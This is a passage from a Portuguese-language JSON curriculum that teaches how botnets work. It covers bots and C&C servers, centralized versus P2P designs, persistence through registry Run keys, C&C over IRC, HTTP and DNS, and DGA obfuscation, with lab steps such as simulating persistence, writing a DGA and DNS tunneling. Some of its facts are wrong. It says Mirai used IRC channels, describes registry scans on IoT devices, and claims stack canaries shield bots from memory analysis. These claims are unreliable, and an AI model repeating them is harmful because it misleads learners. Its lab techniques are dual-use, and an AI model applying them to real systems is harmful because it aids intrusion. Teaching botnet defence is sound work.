                            "description": "Reconhecer e descrever os elementos essenciais de uma botnet, como hosts infectados (bots zumbis), servidores C&C e possíveis estruturas hierárquicas, relacionando com análise de binários e execução de código vulnerável conforme bibliografia de Du e Pfleeger.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Botnets",
                                  "subSteps": [
                                    "Ler a definição de botnet conforme Du e Pfleeger: rede de hosts infectados controlados remotamente.",
                                    "Estudar o propósito principal: coordenação para ataques como DDoS.",
                                    "Diferenciar botnet de outros malwares, como worms ou trojans isolados.",
                                    "Revisar exemplos históricos de botnets para contextualizar.",
                                    "Anotar os elementos essenciais: bots, C&C e hierarquias."
                                  ],
                                  "verification": "Escrever um resumo de 100 palavras definindo botnet e seus componentes chave.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Capítulo relevante de Du e Pfleeger",
                                    "Artigos da Wikipedia e Krebs on Security sobre botnets"
                                  ],
                                  "tips": "Use diagramas visuais para mapear conceitos iniciais.",
                                  "learningObjective": "Definir botnet e distinguir seus componentes básicos de outros malwares.",
                                  "commonMistakes": [
                                    "Confundir botnet com vírus autônomos",
                                    "Ignorar o controle centralizado"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Bots Zumbis (Hosts Infectados)",
                                  "subSteps": [
                                    "Analisar como bots são infectados via vulnerabilidades em binários ou execução de código malicioso.",
                                    "Descrever características: hosts comprometidos que executam comandos silenciosamente.",
                                    "Estudar métodos de infecção: exploits, phishing ou downloads drive-by.",
                                    "Examinar comunicação: bots 'phoning home' para C&C.",
                                    "Mapear exemplos: dispositivos IoT em botnets como Mirai."
                                  ],
                                  "verification": "Listar 3 métodos de infecção de bots e verificar com referências.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Ferramentas como Wireshark para simular tráfego",
                                    "Relatórios de botnets (ex: Mirai source code análise)"
                                  ],
                                  "tips": "Foque em binários vulneráveis como entry points.",
                                  "learningObjective": "Reconhecer bots como hosts infectados e seus mecanismos de comprometimento.",
                                  "commonMistakes": [
                                    "Subestimar escala (milhares de bots)",
                                    "Confundir bots com servidores"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Reconhecer Servidores C&C e Estruturas Hierárquicas",
                                  "subSteps": [
                                    "Definir C&C: servidores que enviam comandos para bots.",
                                    "Estudar protocolos: IRC, HTTP ou P2P para comunicação.",
                                    "Analisar hierarquias: C&C principal, bots intermediários (handlers).",
                                    "Diagramar fluxos: comando de C&C → bots → ataque DDoS.",
                                    "Relacionar com análise de binários: strings e callbacks em malware."
                                  ],
                                  "verification": "Desenhar um diagrama simples de C&C controlando 5 bots.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Software de diagramação como Draw.io",
                                    "Amostras de malware em VirusTotal (somente análise estática)"
                                  ],
                                  "tips": "Procure por IPs hardcoded em binários para identificar C&C.",
                                  "learningObjective": "Descrever servidores C&C e hierarquias em botnets.",
                                  "commonMistakes": [
                                    "Assumir estrutura plana",
                                    "Ignorar redundância em C&C"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Relacionar Componentes com Análise Prática de Vulnerabilidades",
                                  "subSteps": [
                                    "Executar análise estática de um binário de malware simulado.",
                                    "Identificar callbacks para C&C em código desmontado.",
                                    "Simular infecção vulnerável em ambiente controlado (VM).",
                                    "Correlacionar componentes: infecção leva a bot, que obedece C&C.",
                                    "Documentar observações relacionando à bibliografia."
                                  ],
                                  "verification": "Produzir relatório curto identificando componentes em um exemplo dado.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "IDA Pro Free ou Ghidra para análise de binários",
                                    "VMware com snapshots para simulação segura"
                                  ],
                                  "tips": "Sempre use ambientes isolados para evitar riscos reais.",
                                  "learningObjective": "Integrar identificação de componentes via análise de binários e código.",
                                  "commonMistakes": [
                                    "Executar malware fora de sandbox",
                                    "Não correlacionar com hierarquia"
                                  ]
                                }
                              ],
                              "practicalExample": "Usando Ghidra, analise o binário do malware Mirai: identifique strings de C&C (ex: IRC channels), funções de infecção em dispositivos Telnet vulneráveis e fluxos hierárquicos onde bots reportam para handlers, simulando um diagrama de 10.000 bots em DDoS contra um site.",
                              "finalVerifications": [
                                "Listar corretamente bots zumbis, C&C e hierarquias com definições.",
                                "Desenhar diagrama completo de botnet com 3+ componentes.",
                                "Explicar infecção via binário vulnerável com exemplo.",
                                "Relacionar a Du e Pfleeger em parágrafo.",
                                "Identificar C&C em tráfego Wireshark simulado.",
                                "Diferenciar botnet de DDoS simples."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de todos componentes (bots, C&C, hierarquia).",
                                "Uso correto de terminologia técnica de cibersegurança.",
                                "Profundidade na relação com análise de binários.",
                                "Clareza em diagramas e explicações.",
                                "Referência adequada à bibliografia.",
                                "Demonstração de verificações práticas."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: protocolos de comunicação C&C (IRC/HTTP).",
                                "Análise de Malware: reverse engineering de binários.",
                                "Programação: compreensão de exploits em C/C++ vulneráveis.",
                                "Ética e Direito: implicações legais de botnets em ciberdefesa.",
                                "Análise Forense: detecção em logs de rede."
                              ],
                              "realWorldApplication": "Em um centro de operações de segurança (SOC), analistas usam essa habilidade para detectar botnets em tráfego de rede, identificando C&C suspeitos via análise de binários e mitigando DDoS em massa, como no caso do ataque à Dyn em 2016 por Mirai."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.1.2",
                            "name": "Diferenciar arquiteturas de botnets",
                            "description": "Comparar botnets centralizadas (baseadas em servidores C&C únicos) versus descentralizadas (P2P), destacando vantagens em resiliência para ataques DDoS e ligação com segurança BGP e DNS.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Botnets Centralizadas (C&C Único)",
                                  "subSteps": [
                                    "Defina botnet centralizada: rede de dispositivos infectados controlados por um servidor de Comando e Controle (C&C) único.",
                                    "Explique o fluxo de comunicação: bots se conectam ao C&C via HTTP, IRC ou protocolos personalizados para receber ordens.",
                                    "Descreva a estrutura hierárquica: C&C emite comandos que são propagados para todos os bots.",
                                    "Identifique componentes chave: servidor C&C, bots infectados e canais de comunicação.",
                                    "Pesquise exemplos históricos como Mariposa ou Zeus."
                                  ],
                                  "verification": "Crie um diagrama simples da arquitetura centralizada e explique verbalmente o fluxo de comandos.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet para pesquisa",
                                    "Ferramenta de diagramação como Draw.io ou papel e caneta",
                                    "Artigos sobre botnets como Zeus"
                                  ],
                                  "tips": "Use analogias como um exército com um general central para visualizar melhor.",
                                  "learningObjective": "Identificar e descrever os componentes e funcionamento de uma botnet centralizada.",
                                  "commonMistakes": [
                                    "Confundir C&C com bots",
                                    "Ignorar protocolos de comunicação como IRC"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender Botnets Descentralizadas (P2P)",
                                  "subSteps": [
                                    "Defina botnet P2P: ausência de C&C único; bots se comunicam diretamente uns com os outros via rede peer-to-peer.",
                                    "Explique mecanismos de coordenação: uso de DHT (Distributed Hash Table) ou listas de peers para propagar comandos.",
                                    "Descreva resiliência inerente: remoção de um peer não derruba a rede inteira.",
                                    "Compare com redes P2P como BitTorrent para entender distribuição.",
                                    "Pesquise exemplos como Gameover Zeus ou ZeroAccess."
                                  ],
                                  "verification": "Desenhe um diagrama P2P mostrando comunicação entre 5-10 bots sem ponto central.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet",
                                    "Ferramenta de diagramação",
                                    "Documentação sobre Gameover Zeus"
                                  ],
                                  "tips": "Pense em uma teia de aranha onde cada fio é uma conexão P2P para resiliência.",
                                  "learningObjective": "Descrever a estrutura e vantagens da comunicação P2P em botnets.",
                                  "commonMistakes": [
                                    "Achar que P2P significa sem coordenação alguma",
                                    "Confundir com blockchains sem entender DHT"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar Resiliência a Ataques DDoS",
                                  "subSteps": [
                                    "Analise vulnerabilidades centralizadas: derrubar o C&C desativa toda a botnet (ex: takedown de servidores).",
                                    "Analise forças descentralizadas: difícil de desmantelar devido à ausência de single point of failure.",
                                    "Compare métricas: tempo de recuperação, custo de ataque, escalabilidade em DDoS.",
                                    "Discuta táticas de defesa: sinkholing para centralizadas vs. monitoramento de tráfego P2P.",
                                    "Crie uma tabela comparativa com colunas: Arquitetura, Resiliência DDoS, Facilidade de Takedown."
                                  ],
                                  "verification": "Preencha e apresente a tabela comparativa explicando pelo menos 3 diferenças chave.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Planilha ou documento para tabela",
                                    "Relatórios de ataques DDoS como o de 2016 Dyn"
                                  ],
                                  "tips": "Use dados reais de ataques para quantificar resiliência (ex: botnets P2P sobrevivem semanas após takedowns).",
                                  "learningObjective": "Avaliar diferenças em resiliência DDoS entre arquiteturas centralizadas e P2P.",
                                  "commonMistakes": [
                                    "Superestimar resiliência centralizada",
                                    "Ignorar que P2P pode ser mais lento em comandos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Explorar Ligações com BGP e DNS",
                                  "subSteps": [
                                    "Explique uso de DNS em botnets: Domain Generation Algorithms (DGA) para C&C dinâmicos em centralizadas.",
                                    "Descreva BGP em contextos de botnet: hijacking de rotas BGP para redirecionar tráfego DDoS ou mascarar C&C.",
                                    "Compare: centralizadas dependem mais de DNS/BGP para ofuscação; P2P usa menos mas ainda vulnerável a filtros BGP.",
                                    "Analise casos reais: BGP hijacks em ataques DDoS ou DNS amplification via botnets.",
                                    "Discuta defesas: BGPsec, DNSSEC e monitoramento de fluxos anômalos."
                                  ],
                                  "verification": "Escreva um parágrafo conectando BGP/DNS a uma arquitetura específica com exemplo.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Acesso à internet para casos BGP hijack",
                                    "Ferramentas como BGPStream ou Hurricane Electric BGP toolkit"
                                  ],
                                  "tips": "Visualize DNS como 'telefone' para C&C e BGP como 'estradas' para tráfego.",
                                  "learningObjective": "Relacionar protocolos BGP e DNS às vulnerabilidades e forças das arquiteturas de botnets.",
                                  "commonMistakes": [
                                    "Confundir DGA com DNS normal",
                                    "Subestimar impacto de BGP em P2P"
                                  ]
                                }
                              ],
                              "practicalExample": "Simule uma botnet em um ambiente virtual: use VirtualBox para criar 5 VMs como bots. Configure uma centralizada com um servidor Nginx como C&C enviando comandos via curl. Para P2P, use um script Python com sockets para comunicação peer-to-peer simulando comandos DDoS. Teste 'resiliência' desligando o C&C e observando impacto.",
                              "finalVerifications": [
                                "Explicar verbalmente diferenças entre centralizada e P2P com exemplos.",
                                "Desenhar diagramas precisos de ambas arquiteturas.",
                                "Identificar pelo menos 3 vantagens de P2P em DDoS.",
                                "Relacionar corretamente BGP/DNS a uma botnet real.",
                                "Preencher tabela comparativa sem erros factuais.",
                                "Discutir defesas específicas para cada tipo."
                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: definições e comparações corretas (30%)",
                                "Profundidade de análise: cobertura de resiliência e protocolos (25%)",
                                "Clareza de diagramas e tabelas (20%)",
                                "Uso de exemplos reais e práticos (15%)",
                                "Capacidade de verbalizar conexões interdisciplinares (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Protocolos BGP, DNS e P2P",
                                "Programação: Scripts para simulação de bots e DGA",
                                "Matemática: Modelos probabilísticos de resiliência em grafos",
                                "Ética e Direito: Implicações legais de botnets e ciberdefesa",
                                "Análise de Dados: Monitoramento de tráfego com Wireshark"
                              ],
                              "realWorldApplication": "Em equipes de SOC (Security Operations Center), diferenciar arquiteturas ajuda a priorizar takedowns: focar em C&C para centralizadas (ex: FBI takedown de Emotet) ou filtros P2P para descentralizadas (ex: mitigação de Mirai variants em provedores ISP usando BGP anycast)."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.1.3",
                            "name": "Analisar persistência de bots",
                            "description": "Explicar técnicas de persistência em sistemas operacionais infectados, como modificação de registros de inicialização e proteção de memória com canários, para manter bots ativos em ataques distribuídos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Conceitos Fundamentais de Persistência em Malware",
                                  "subSteps": [
                                    "Defina persistência em bots como a capacidade de sobreviver a reinicializações e execuções manuais de limpeza.",
                                    "Explique a importância em botnets DDoS: manter o bot ativo para receber comandos C2 continuamente.",
                                    "Classifique tipos de persistência: nível usuário (HKCU), nível sistema (HKLM), serviços e tarefas agendadas.",
                                    "Discuta ciclo de vida de um bot: infecção inicial, persistência, comunicação C2 e execução de payload DDoS.",
                                    "Identifique vetores comuns de infecção que levam à persistência."
                                  ],
                                  "verification": "Crie um diagrama do ciclo de persistência de um bot e liste 3 exemplos de impacto em DDoS.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação Microsoft sobre Registry",
                                    "Artigos sobre botnets (ex: Krebs on Security)",
                                    "Ferramenta de desenho como Draw.io"
                                  ],
                                  "tips": "Use analogias como 'um alarme que toca toda vez que o PC liga' para visualizar persistência.",
                                  "learningObjective": "Entender o papel da persistência na longevidade de botnets.",
                                  "commonMistakes": [
                                    "Confundir persistência com ofuscação de código",
                                    "Ignorar diferenças entre SOs",
                                    "Subestimar detecção por AV"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar Técnicas de Persistência via Registros de Inicialização",
                                  "subSteps": [
                                    "Navegue pelo Registry do Windows: foque em HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run e RunOnce.",
                                    "Identifique entradas suspeitas: nomes aleatórios, caminhos em %AppData% ou %Temp%.",
                                    "Simule criação de uma entrada de persistência usando reg add em uma VM.",
                                    "Use ferramentas como Autoruns ou ProcMon para monitorar carregamentos automáticos.",
                                    "Analise logs do Event Viewer para eventos de inicialização relacionados (Event ID 7045 para serviços)."
                                  ],
                                  "verification": "Capture screenshot de Autoruns mostrando uma entrada de persistência simulada e remova-a.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "VM Windows infectável (ex: Windows 10 em VirtualBox)",
                                    "Sysinternals Autoruns e ProcMon",
                                    "Regedit"
                                  ],
                                  "tips": "Sempre execute em sandbox isolada para evitar infecções reais.",
                                  "learningObjective": "Identificar e analisar modificações em registros de inicialização comuns em bots Windows.",
                                  "commonMistakes": [
                                    "Editar registry sem backup",
                                    "Não diferenciar Run de RunOnce",
                                    "Ignorar permissões HKLM vs HKCU"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Proteção de Memória com Canários em Bots Persistentes",
                                  "subSteps": [
                                    "Explique stack canaries: valores randômicos no stack para detectar buffer overflows e proteger o processo do bot.",
                                    "Analise como bots usam canários para se auto-proteger contra injeções ou dumps de memória.",
                                    "Estude bypasses: técnicas como ROP chains ou leaks de canário via side-channels.",
                                    "Use ferramentas como ROPgadget ou checksec para verificar proteções em binários de malware simulados.",
                                    "Simule um bot com canário ativado compilando um exemplo em C com -fstack-protector."
                                  ],
                                  "verification": "Compile e execute um binário com canário, tente overflow e demonstre falha/detecção.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "GCC compiler em Linux VM",
                                    "Exemplos de código C de buffer overflow (GitHub repos educacionais)",
                                    "GDB debugger"
                                  ],
                                  "tips": "Compile com ASLR e PIE desabilitados inicialmente para facilitar análise.",
                                  "learningObjective": "Compreender como proteções de memória mantêm bots ativos contra análise forense.",
                                  "commonMistakes": [
                                    "Confundir canários com ASLR",
                                    "Não recompilar com flags corretas",
                                    "Ignorar canários em userland vs kernel"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Verificar Persistência em Diferentes Sistemas Operacionais e Mitigar",
                                  "subSteps": [
                                    "Analise persistência Linux: crontab, @reboot jobs, systemd services (/etc/systemd/system/).",
                                    "Compare com macOS: LaunchAgents e LaunchDaemons em ~/Library/LaunchAgents.",
                                    "Use scripts para scan automatizado: Autoruns equivalente como ps1 scripts ou LinuxExploitSuggester.",
                                    "Teste remoção: kill processes, delete entries e verifique reinicialização.",
                                    "Documente IOCs (Indicators of Compromise) como hashes e caminhos para relatórios."
                                  ],
                                  "verification": "Crie relatório com IOCs de persistência em 2 SOs e passos de mitigação.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "VMs Linux e macOS",
                                    "Autoruns para Linux (sysdig)",
                                    "Scripts PowerShell para Windows scan"
                                  ],
                                  "tips": "Automatize scans com Volatility para memória dump se avançado.",
                                  "learningObjective": "Aplicar análise cross-platform e preparar mitigação em cenários de botnet.",
                                  "commonMistakes": [
                                    "Focar só em Windows",
                                    "Não testar após remoção",
                                    "Esquecer persistência rootkit"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma VM Windows, baixe um sample benigno de bot (ex: de MalwareBazaar marcado como PoC), execute e use Autoruns para detectar entrada em HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run apontando para %AppData%\\bot.exe. Monitore com ProcMon o carregamento na inicialização e identifique o canário via GDB em um payload Linux simulado.",
                              "finalVerifications": [
                                "Liste e explique 5 técnicas de persistência comuns em botnets.",
                                "Identifique entradas de registry em um log fornecido.",
                                "Explique como canários protegem bots de análise de memória.",
                                "Simule detecção e remoção em VM.",
                                "Crie diagrama de fluxo de persistência em DDoS.",
                                "Compare persistência Windows vs Linux."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de técnicas (90%+ corretas).",
                                "Profundidade nos substeps e verificações práticas.",
                                "Correta explicação de canários e bypasses.",
                                "Relatório claro com IOCs e mitigação.",
                                "Uso adequado de ferramentas sem erros comuns.",
                                "Conexão explícita com botnets DDoS."
                              ],
                              "crossCurricularConnections": [
                                "Sistemas Operacionais: Registry e init systems.",
                                "Programação: Análise de binários em C/Assembly.",
                                "Redes: Comunicação C2 em botnets.",
                                "Análise Forense: Ferramentas como Volatility e Autoruns.",
                                "Ética em Cibersegurança: Uso responsável de samples."
                              ],
                              "realWorldApplication": "Analistas de SOC usam essas técnicas para investigar incidentes DDoS, como o ataque Mirai em 2016, detectando persistência em IoT infectados via registry scans e removendo bots para restaurar serviços críticos."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.5.4.2",
                        "name": "Mecanismos de Controle e Comunicação",
                        "description": "Protocolos e métodos usados pelo botmaster para comandar bots, incluindo criptografia e ofuscação para evitar detecção em operações DDoS.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.4.2.1",
                            "name": "Descrever protocolos de C&C",
                            "description": "Detalhar protocolos comuns como IRC, HTTP/HTTPS e DNS para comunicação C&C, relacionando com funções hash e cifradores simétricos para segurança nas comunicações, conforme Stallings.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Protocolos de Controle e Comando (C&C)",
                                  "subSteps": [
                                    "Definir protocolos C&C como mecanismos de comunicação entre o controlador (botmaster) e bots em uma botnet.",
                                    "Explicar o papel dos C&C na coordenação de ataques DDoS, como distribuição de comandos para inundar alvos.",
                                    "Identificar requisitos chave: discrição (evitar detecção), confiabilidade (tolerância a falhas) e escalabilidade (suportar milhares de bots), conforme conceitos de Stallings."
                                  ],
                                  "verification": "Escrever um parágrafo resumindo o propósito e requisitos dos protocolos C&C, citando Stallings.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Livro 'Cryptography and Network Security' de Stallings (capítulos sobre comunicações seguras)",
                                    "Artigos online sobre botnets (ex: Krebs on Security)"
                                  ],
                                  "tips": "Visualize C&C como o 'QG remoto' da botnet, similar a um chat grupal criptografado.",
                                  "learningObjective": "Dominar o conceito básico e a importância estratégica dos protocolos C&C em botnets.",
                                  "commonMistakes": "Confundir C&C com protocolos de infecção inicial do malware, focando apenas em controle posterior."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Protocolo IRC para Comunicação C&C",
                                  "subSteps": [
                                    "Descrever IRC como protocolo de chat baseado em texto na porta 6667, com canais e nicks.",
                                    "Explicar adaptações em botnets: bots joinam canais dedicados para receber comandos como 'DDoS target.com'.",
                                    "Discutir vantagens (simples, leve) e desvantagens (tráfego legível, fácil bloqueio por signatures)."
                                  ],
                                  "verification": "Diagrama ou fluxograma mostrando um bot recebendo comando via IRC.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "RFC 1459 (IRC Protocol)",
                                    "Ferramenta Wireshark para capturar tráfego IRC simulado"
                                  ],
                                  "tips": "Teste um servidor IRC local para ver comandos em ação.",
                                  "learningObjective": "Entender como IRC é explorado para C&C devido à sua simplicidade inerente.",
                                  "commonMistakes": "Ignorar que IRC moderno usa SSL/TLS, subestimando sua ofuscação."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar HTTP/HTTPS e DNS em Comunicações C&C",
                                  "subSteps": [
                                    "Descrever HTTP/HTTPS como web protocols (portas 80/443), com comandos embutidos em requests POST ou URLs dinâmicas.",
                                    "Explicar DNS para C&C: uso de fluxos DNS (DNS tunneling) para exfiltração de dados ou comandos via queries TXT.",
                                    "Comparar: HTTPS ofusca com TLS, DNS evade firewalls por ser 'legítimo'."
                                  ],
                                  "verification": "Listar 3 exemplos de comandos C&C via HTTP e 2 via DNS, com payloads simulados.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação MDN Web Docs para HTTP/HTTPS",
                                    "Ferramentas como dnscat2 para demo de DNS tunneling"
                                  ],
                                  "tips": "Use Burp Suite ou similar para inspecionar requests HTTP simulando C&C.",
                                  "learningObjective": "Identificar como protocolos legítimos são abusados para C&C stealth.",
                                  "commonMistakes": "Confundir HTTP com HTTPS, ignorando o papel crítico da criptografia TLS em evasão."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Integrar Funções Hash e Cifradores Simétricos para Segurança em C&C",
                                  "subSteps": [
                                    "Explicar hashes (ex: MD5/SHA) para autenticação: bot verifica integridade de comandos.",
                                    "Detalhar cifradores simétricos (AES) para encriptar payloads, chaves compartilhadas via infecção inicial, conforme Stallings.",
                                    "Relacionar: hash + cifra previne MITM e detecção em IRC/HTTP/DNS."
                                  ],
                                  "verification": "Pseudocódigo de um bot verificando hash de comando AES-criptografado.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Stallings: Capítulos 11 (Hashes) e 9 (Cifra Simétrica)",
                                    "Biblioteca OpenSSL para testes"
                                  ],
                                  "tips": "Lembre: chaves simétricas são rápidas para botnets massivas.",
                                  "learningObjective": "Aplicar conceitos criptográficos de Stallings à segurança de comunicações C&C.",
                                  "commonMistakes": "Usar hash para encriptação (hash é one-way), confundindo com cifra reversível."
                                }
                              ],
                              "practicalExample": "Configure um ambiente lab com Metasploit: infecte uma VM com botnet simulada usando IRC C&C; envie comando DDoS criptografado com AES e hash SHA256 via HTTPS, capturando com Wireshark para análise.",
                              "finalVerifications": [
                                "Listar e descrever IRC, HTTP/HTTPS e DNS como protocolos C&C com exemplos.",
                                "Explicar como hashes autenticam comandos e AES os encripta.",
                                "Diagrama de fluxo C&C completo em botnet DDoS.",
                                "Identificar 2 vantagens/desvantagens de cada protocolo.",
                                "Relacionar conceitos com Stallings em segurança de comunicações."
                              ],
                              "assessmentCriteria": [
                                "Precisão descritiva dos protocolos (90% correto).",
                                "Correta integração de hash e cifra simétrica (com exemplos).",
                                "Profundidade em substeps e verificações (cobertura completa).",
                                "Criatividade no diagrama/exemplo prático.",
                                "Referências adequadas a Stallings e contexto DDoS."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Camadas de transporte/aplicação no modelo TCP/IP.",
                                "Criptografia: Aplicação prática de primitives hash e AES.",
                                "Análise Forense: Detecção de anomalias em tráfego Wireshark.",
                                "Programação: Scripts Python para simular bots C&C."
                              ],
                              "realWorldApplication": "Analistas de segurança em SOCs detectam C&C em tráfego real (ex: Mirai botnet usou IRC/HTTP), bloqueando IPs/domínios para mitigar DDoS em infraestruturas críticas como bancos e governos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.4.2.2",
                            "name": "Explicar ofuscação em comunicações",
                            "description": "Analisar técnicas de ofuscação, como Domain Generation Algorithms (DGA) com números pseudoaleatórios e criptografia de chave pública, para resiliência contra sistemas de prevenção de intrusão.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Fundamentos de Ofuscação em Comunicações Cibernéticas",
                                  "subSteps": [
                                    "Defina ofuscação como a técnica de ocultar padrões de comunicação para evitar detecção.",
                                    "Identifique contextos comuns em ataques cibernéticos, como botnets em DDoS.",
                                    "Diferencie ofuscação de criptografia: ofuscação mascara tráfego, criptografia protege conteúdo.",
                                    "Revise exemplos iniciais de ofuscação simples, como tunelamento em protocolos legítimos.",
                                    "Analise por que sistemas de prevenção de intrusão (IPS) dependem de assinaturas de tráfego."
                                  ],
                                  "verification": "Resuma em 3 frases os conceitos chave e explique como IPS detectam comunicações normais.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artigo sobre IPS (ex: NIST SP 800-94), vídeo introdutório sobre ofuscação (YouTube: 10 min).",
                                  "tips": "Use analogias como 'camuflagem em guerra' para fixar o conceito.",
                                  "learningObjective": "Entender o propósito e mecanismos básicos de ofuscação contra detecção automatizada.",
                                  "commonMistakes": "Confundir ofuscação com criptografia; assumir que ofuscação sempre envolve encriptação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Explorar Domain Generation Algorithms (DGA) com Números Pseudoaleatórios",
                                  "subSteps": [
                                    "Explique DGA: algoritmo que gera domínios dinâmicos baseados em sementes e tempo.",
                                    "Implemente um DGA simples em Python usando hashlib para pseudoaleatoriedade.",
                                    "Teste geração de domínios para um dia específico e compare com blacklists.",
                                    "Analise como DGA evita bloqueios estáticos de C2 (Command and Control).",
                                    "Discuta variantes: DGA baseados em palavras, mutações ou machine learning."
                                  ],
                                  "verification": "Gere 5 domínios DGA via código e explique por que eles são resilientes a bloqueios.",
                                  "estimatedTime": "90 minutos",
                                  "materials": "Python instalado, código exemplo DGA (GitHub: 'simple-dga'), documentação hashlib.",
                                  "tips": "Comece com sementes fixas para depuração antes de usar tempo real.",
                                  "learningObjective": "Dominar o funcionamento de DGA e sua role em comunicações ofuscadas de botnets.",
                                  "commonMistakes": "Ignorar dependência temporal; gerar domínios previsíveis sem entropia adequada."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Criptografia de Chave Pública na Ofuscação de Comunicações",
                                  "subSteps": [
                                    "Revise conceitos de criptografia assimétrica: chaves pública/privada (RSA/ECDH).",
                                    "Descreva uso em C2: bots usam chaves efêmeras para trocar comandos sem padrões fixos.",
                                    "Simule handshake TLS com chaves rotativas para mascarar tráfego.",
                                    "Compare com criptografia simétrica: assimétrica adiciona resiliência via rotação.",
                                    "Examine integrações: DGA + criptografia para endpoints dinâmicos e encriptados."
                                  ],
                                  "verification": "Desenhe um diagrama de fluxo de comunicação ofuscada usando DGA e chave pública.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Ferramenta Wireshark para capturar tráfego TLS, tutoriais OpenSSL.",
                                  "tips": "Visualize chaves como 'senhas únicas por sessão' para simplificar.",
                                  "learningObjective": "Compreender como criptografia de chave pública reforça ofuscação contra IPS.",
                                  "commonMistakes": "Confundir chaves pública/privada; subestimar overhead computacional em botnets."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Sintetizar Resiliência Contra Sistemas de Prevenção de Intrusão",
                                  "subSteps": [
                                    "Integre DGA e criptografia: explique ciclo completo em botnets DDoS.",
                                    "Simule detecção IPS: crie assinaturas para tráfego não-ofuscado vs. ofuscado.",
                                    "Discuta contra-medidas: machine learning para detecção comportamental de DGA.",
                                    "Avalie trade-offs: custo computacional vs. evasão efetiva.",
                                    "Crie uma explicação concisa (1 página) para um público não-técnico."
                                  ],
                                  "verification": "Apresente explicação oral ou escrita cobrindo todos os elementos.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Ferramentas IPS simuladas (Snort rules), exemplos de botnets reais (Mirai).",
                                  "tips": "Use mindmaps para conectar DGA, cripto e IPS em um fluxo visual.",
                                  "learningObjective": "Analisar como técnicas combinadas criam comunicações resilientes em ataques.",
                                  "commonMistakes": "Focar só em uma técnica; ignorar evoluções de IPS baseadas em IA."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Praticar Explicação e Análise de Cenários Reais",
                                  "subSteps": [
                                    "Estude caso real: botnet Necurs usando DGA + criptografia.",
                                    "Crie um relatório analisando ofuscação em um ataque DDoS documentado.",
                                    "Debata vulnerabilidades: como honeypots detectam DGA moderno.",
                                    "Desenvolva uma defesa hipotética contra essas técnicas.",
                                    "Autoavalie compreensão respondendo a perguntas de verificação."
                                  ],
                                  "verification": "Produza relatório de 500 palavras com diagramas e referências.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Relatórios de threat intel (ex: FireEye sobre Necurs), ferramentas de visualização (Draw.io).",
                                  "tips": "Inclua métricas reais como taxa de detecção para credibilidade.",
                                  "learningObjective": "Aplicar conhecimentos para explicar e analisar ofuscação em contextos reais.",
                                  "commonMistakes": "Generalizar demais sem evidências; omitir contra-medidas defensivas."
                                }
                              ],
